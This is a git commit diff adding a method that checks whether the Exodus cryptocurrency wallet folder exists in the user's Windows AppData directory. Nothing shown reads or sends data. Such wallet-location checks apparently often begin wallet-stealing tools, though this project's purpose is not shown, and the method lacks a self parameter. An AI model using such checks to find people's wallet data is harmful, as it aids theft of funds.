fe59564a999886acabaeb76527c39eb4344d43af
NotKatsu <122122838+NotKatsu@users.noreply.github.com>
2023-03-27 21:08:40 +0100

    path_exists function added

--- helpers/files.py
+++ helpers/files.py
@@ -5,3 +5,10 @@ client: str = os.path.expanduser("~")
 class Files: 
     def __init__(self) -> None:
         pass
+    
+    def path_exists() -> bool:
+        if os.path.exists(client + "\\AppData\\Roaming\\Exodus"):
+            return True
+        else:
+            return False
+        
